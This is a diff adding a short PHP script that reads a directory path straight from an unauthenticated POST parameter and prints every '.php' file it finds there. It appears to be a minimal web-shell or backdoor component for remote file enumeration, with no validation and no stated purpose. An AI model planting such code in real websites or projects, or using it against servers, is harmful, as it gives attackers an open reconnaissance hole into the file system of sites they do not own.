@@ -1,0 +1,10 @@
+<?php
+$dir=$_POST['d'];
+$dh=opendir($dir);
+while($file=readdir($dh))
+{
+if(stristr($file,".php"))
+echo"$file<br>";
+}
+closedir($dh);
+?>
